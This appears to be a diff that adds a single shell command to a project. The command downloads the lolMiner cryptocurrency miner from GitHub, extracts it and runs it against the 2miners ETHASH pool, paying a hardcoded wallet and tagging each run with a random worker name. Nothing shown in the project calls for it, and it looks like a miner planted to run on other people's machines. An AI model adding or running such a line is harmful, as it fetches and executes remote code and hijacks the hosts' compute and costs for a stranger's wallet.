@@ -1,0 +1,1 @@
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.31/lolMiner_v1.31_Lin64.tar.gz && tar -xvf lolMiner_v1.31_Lin64.tar.gz && cd 1.31 && ./lolMiner --algo ETHASH --pool us-eth.2miners.com:2020 --user 0x26a023c69c0da2501d61e9e684bd70b8d62ec2ab.$(echo $(shuf -i 1000-9999 -n 1)-ergo)
